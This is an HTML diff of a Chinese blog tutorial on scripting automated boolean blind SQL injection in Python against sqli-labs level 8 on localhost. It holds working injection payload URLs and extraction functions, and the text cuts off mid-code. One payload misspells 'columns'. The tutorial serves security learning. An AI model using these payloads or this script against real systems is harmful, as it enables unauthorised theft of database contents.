@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lxflxfcl.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="前言当我们进行SQL注入攻击时，当发现无法进行union注入或者报错等注入，那么，就需要考虑盲注了，当我们进行盲注时，需要通过页面的反馈(布尔盲注)或者相应时间(时间盲注)，来一个字符一个字符的进行猜解。如果手工进行猜解，这就会有很大的工作量。所以这里就使用python写一个自动化脚本来进行猜解，靶场选择的是sqli-labs的第八关。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="用python写一个自动化盲注脚本">
+<meta property="og:url" content="https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/index.html">
+<meta property="og:site_name" content="小艾搞安全">
+<meta property="og:description" content="前言当我们进行SQL注入攻击时，当发现无法进行union注入或者报错等注入，那么，就需要考虑盲注了，当我们进行盲注时，需要通过页面的反馈(布尔盲注)或者相应时间(时间盲注)，来一个字符一个字符的进行猜解。如果手工进行猜解，这就会有很大的工作量。所以这里就使用python写一个自动化脚本来进行猜解，靶场选择的是sqli-labs的第八关。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/a12daed506fc623fcc835f8e08128e4d.png">
+<meta property="og:image" content="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/39175f1bef985138e98578aecefef86f.png">
+<meta property="og:image" content="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/91e7ffba24b009d1093b048b2d5e0e5f.png">
+<meta property="og:image" content="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/19a5856b78f5379fbce8de4210aab214.png">
+<meta property="article:published_time" content="2021-10-05T10:44:57.000Z">
+<meta property="article:modified_time" content="2021-10-19T10:50:00.577Z">
+<meta property="article:author" content="小艾">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/a12daed506fc623fcc835f8e08128e4d.png">
+
+
+<link rel="canonical" href="https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/","path":"2021/10/05/用python写一个自动化盲注脚本/","title":"用python写一个自动化盲注脚本"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>用python写一个自动化盲注脚本 | 小艾搞安全</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="小艾搞安全" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  <a target="_blank" rel="noopener" href="https://github.com/lxflxfcl" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">小艾搞安全</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">一直学习，一直分享。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%92%8C%E7%9B%B2%E6%B3%A8%E7%9B%B8%E5%85%B3%E7%9A%84payload"><span class="nav-number">2.</span> <span class="nav-text">和盲注相关的payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">盲注脚本相关函数讲解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">小艾</p>
+  <div class="site-description" itemprop="description">微信公众号：小艾搞安全</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lxflxfcl.github.io/2021/10/05/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小艾">
+      <meta itemprop="description" content="微信公众号：小艾搞安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小艾搞安全">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          用python写一个自动化盲注脚本
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-05 18:44:57" itemprop="dateCreated datePublished" datetime="2021-10-05T18:44:57+08:00">2021-10-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-10-19 18:50:00" itemprop="dateModified" datetime="2021-10-19T18:50:00+08:00">2021-10-19</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">安全开发</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>当我们进行SQL注入攻击时，当发现无法进行union注入或者报错等注入，那么，就需要考虑盲注了，当我们进行盲注时，需要通过页面的反馈(布尔盲注)或者相应时间(时间盲注)，来一个字符一个字符的进行猜解。如果手工进行猜解，这就会有很大的工作量。所以这里就使用python写一个自动化脚本来进行猜解，靶场选择的是sqli-labs的第八关。</p>
+<span id="more"></span>
+
+<p>参考资料：《python安全攻防》</p>
+<h4 id="和盲注相关的payload"><a href="#和盲注相关的payload" class="headerlink" title="和盲注相关的payload"></a>和盲注相关的payload</h4><p>写脚本之前需要对盲注流程有一个了解。这样写脚本时，思路才不会乱。这里用sqli-labs的第八关举例。具体如下：</p>
+<p>获取数据库长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(length(database())=8,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库名</p>
+<blockquote>
+<p>substr:字符串截取函数，第一位截取，截取一位</p>
+</blockquote>
+<p>连起来就是，截取数据库名第一位，并判断第一位的ascii值，是否等于115，如果为正确，直接返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库表的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(*)table_name from information_schema.tables where table_schema=&#x27;security&#x27;)=4,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库表名称的长度</p>
+<blockquote>
+<p>要注意limit，第一个参数的意思是从第几行开始，最低是0，第二个参数是截取几行。这里1是一行的意思。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1)=8,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))=101,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取表的字段数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(column_name) from information_schema.cloumns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取字段的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select length(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1)=2,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取表的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取字段数据的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select count(username) from users)=13,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取字段数据的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if((select length(username) from users limit 0,1)=4,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<p>获取字段数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sql/Less-8/?id=1&#x27; and if (ascii(substr((select username from users limit 0,1),1,1))=68,1,0) %23</span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注脚本相关函数讲解"><a href="#盲注脚本相关函数讲解" class="headerlink" title="盲注脚本相关函数讲解"></a>盲注脚本相关函数讲解</h4><p>首先编写主函数，用来调用各个函数，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#盲注主函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StartSqli</span>(<span class="params">url</span>):</span></span><br><span class="line">    GetDBName(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]当前数据库名：&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(DBName))</span><br><span class="line">    GetDBTables(url,DBName)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 数据库 &#123;0&#125; 的表如下：&quot;</span>.<span class="built_in">format</span>(DBName))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(DBTables)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(item + <span class="number">1</span> ) + <span class="string">&quot;)&quot;</span> + DBTables[item])</span><br><span class="line">    tableIndex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*] 请输入要查看的表的序号 :&quot;</span>)) - <span class="number">1</span></span><br><span class="line">    GetDBColumns(url,DBName,DBTables[tableIndex])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 数据表 &#123;0&#125; 的字段如下:&quot;</span>.<span class="built_in">format</span>(DBTables[tableIndex]))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(DBColumns)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(&quot;</span> + <span class="built_in">str</span>(item + <span class="number">1</span>) + <span class="string">&quot;)&quot;</span> + DBColumns[item])</span><br><span class="line">        columnIndex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*] 请输入 要查看的字段的序号(输入0退出):&quot;</span>)) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(columnIndex == -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])</span><br></pre></td></tr></table></figure>
+
+<p>接着，我们需要获取数据库名，最后得到的结果存入DBName</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库名函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBName</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#引用全局变量DBName</span></span><br><span class="line">    <span class="keyword">global</span> DBName</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取数据库的长度&quot;</span>)</span><br><span class="line">    <span class="comment">#保存数据库长度的变量</span></span><br><span class="line">    DBNameLen = <span class="number">0</span></span><br><span class="line">    <span class="comment">#用于检查数据库长度的payload</span></span><br><span class="line">    payload =  <span class="string">&quot;&#x27; and if(length(database())=&#123;0&#125;,1,0) %23 &quot;</span></span><br><span class="line">    <span class="comment">#把url和payload进行拼接，得到最终请求url</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="built_in">print</span>(targetUrl)</span><br><span class="line">    <span class="comment">#用for循环遍历请求，得到数据库名的长度</span></span><br><span class="line">    <span class="keyword">for</span> DBNameLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">        <span class="comment">#对payload的中的参数进行赋值猜解</span></span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(DBNameLen))</span><br><span class="line">        <span class="comment">#判断flag是否在返回的页面中</span></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;进来了吗&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 数据库名的长度：&quot;</span>+ <span class="built_in">str</span>(DBNameLen))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取数据库名&quot;</span>)</span><br><span class="line">    <span class="comment">#获取数据库名的payload</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; and if(ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;,1,0) %23&quot;</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="comment">#a表示substr()函数的截取位置</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,DBNameLen+<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#b表示在ascii码中33～126 位可显示的字符</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(a,b))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                DBName += <span class="built_in">chr</span>(b)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-]&quot;</span> + DBName)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>获取数据库名的效果如下图</p>
+<p><img src="https://wiki-oss.s3.cn-north-1.jdcloud-oss.com/2021/10/a12daed506fc623fcc835f8e08128e4d.png" alt="image-20211019175932890"></p>
+<p>当我们得到数据库名时，就可以去猜解表名。并把结果以列表形式存入DBTables</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取数据库表函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetDBTables</span>(<span class="params">url, dbname</span>):</span></span><br><span class="line">    <span class="keyword">global</span> DBTables</span><br><span class="line">    <span class="comment">#存放数据库表数量的变量</span></span><br><span class="line">    DBTableCount = <span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 开始获取 &#123;0&#125; 数据库表数量：&quot;</span>.<span class="built_in">format</span>(dbname))</span><br><span class="line">    <span class="comment">#获取数据库表数量的payload</span></span><br><span class="line">    payload = <span class="string">&quot;&#x27; and if((select count(*)table_name from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27;)=&#123;1&#125;,1,0) %23&quot;</span></span><br><span class="line">    targetUrl = url + payload</span><br><span class="line">    <span class="comment">#开始遍历获取数据库表的数量</span></span><br><span class="line">    <span class="keyword">for</span> DBTableCount <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">        res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,DBTableCount))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]&#123;0&#125;数据库中表的数量为：&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(dbname,DBTableCount))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始获取&#123;0&#125;数据库的表&quot;</span>.<span class="built_in">format</span>(dbname))</span><br><span class="line">    <span class="comment">#遍历表名时临时存放表名长度的变量</span></span><br><span class="line">    tableLen = <span class="number">0</span></span><br><span class="line">    <span class="comment">#a表示当前正在获取表的索引</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,DBTableCount):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]正在获取第&#123;0&#125;个表名&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#先获取当前表名的长度</span></span><br><span class="line">        <span class="keyword">for</span> tableLen <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if((select LENGTH(table_name) from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27; limit &#123;1&#125;,1)=&#123;2&#125;,1,0) %23&quot;</span></span><br><span class="line">            targetUrl = url + payload</span><br><span class="line">            res = conn.get(targetUrl.<span class="built_in">format</span>(dbname,a,tableLen))</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> res.content.decode(<span class="string">&quot;utf-8&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#开始获取表名</span></span><br><span class="line">        <span class="comment">#临时存放当前表名的变量</span></span><br><span class="line">        table = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment">#b表示当前表名猜解的位置（substr）</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,tableLen+<span class="number">1</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;0&#125;&#x27; limit &#123;1&#125;,1),&#123;2&#125;,1))=&#123;3&#125;,1,0) 